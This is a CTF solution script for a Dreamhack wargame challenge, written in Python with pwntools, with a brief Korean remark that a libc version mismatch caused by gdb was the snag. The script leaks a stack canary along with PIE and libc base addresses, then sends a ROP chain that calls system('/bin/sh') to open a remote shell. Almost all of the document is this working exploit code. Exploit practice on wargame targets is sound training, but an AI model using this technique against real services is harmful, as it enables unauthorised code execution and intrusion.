```python
from pwn import *

context.log_level = 'debug'

p = remote('host3.dreamhack.games', 22008)
l = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

#leak
p.sendafter(b'> ', b'2.')
p.sendafter(b'Write: ', b'a' * 0x100)
p.sendafter(b'> ', b'1.')
p.recvuntil(b'a' * 0x100)
rbp = u64(p.recvn(8)[:6] + b'\x00' * 2) - (0x7fffffffe929 - 0x7fffffffe630)
canary = u64(b'\x00' + p.recvn(8)[1:])
pie_base = u64(p.recvn(16)[8:14] + b'\x00' * 2) - (0x5555555554d9 - 0x555555554000)
libc_base = u64(p.recvn(16)[8:14] + b'\x00' * 2) - (0x7ffff7db8d90 - 0x7ffff7d8f000)

print(hex(rbp))
print(hex(canary))
print(hex(pie_base))
print(hex(libc_base))

#ROP
pop_rdi_ret = libc_base + 0x000000000002a3e5
bin_sh = libc_base + list(l.search(b'/bin/sh'))[0]
system = libc_base + l.symbols['system']
ret = libc_base + 0x0000000000029cd6

print(hex(pop_rdi_ret))
print(hex(bin_sh))
print(hex(system))
print(hex(ret))

payload = b'1' + b'\x00' * 0x17 + p64(canary) + p64(rbp) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)

p.sendafter(b'> ', payload + b'.')

p.interactive()
```

깨달은 점 : gdb를 실행하면 libc 버전이 바뀐다
도커 다시 켜서 libc 가져오니까 바로 풀림;;(ret 주소가 달랐다)